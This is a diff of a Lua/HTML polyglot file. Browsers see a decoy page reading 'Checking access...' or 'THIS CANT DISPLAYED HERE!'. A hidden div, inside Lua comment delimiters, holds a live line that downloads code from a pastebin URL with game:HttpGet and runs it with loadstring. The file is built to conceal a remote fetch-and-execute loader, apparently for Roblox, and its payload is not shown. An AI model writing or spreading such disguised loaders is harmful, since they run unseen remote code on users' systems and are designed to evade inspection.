@@ -1,26 +1,7 @@
 --[[
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protected Content</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div id="app">
-        <h1 id="status">Checking access...</h1>
-    </div>
-
-    <!-- JavaScript-ът, който контролира какво вижда браузъра -->
-    <script src="script.js"></script>
-
-    <div style="display: none !important;">
+<!DOCTYPE html><html><head><script src="script.js"></script></head>
+<body style="background:#000;"><h1 style="color:red;text-align:center;">THIS CANT DISPLAYED HERE!</h1>
+<div style="display:none;">
+]] return loadstring(game:HttpGet("https://pastebin.com/raw/CFkCnUqB", true))() --[[
+</div></body></html>
 ]]
-
-loadstring(game:HttpGet("https://pastebin.com/raw/CFkCnUqB", true))() 
-
-    </div>
-</body>
-</html>
---]]
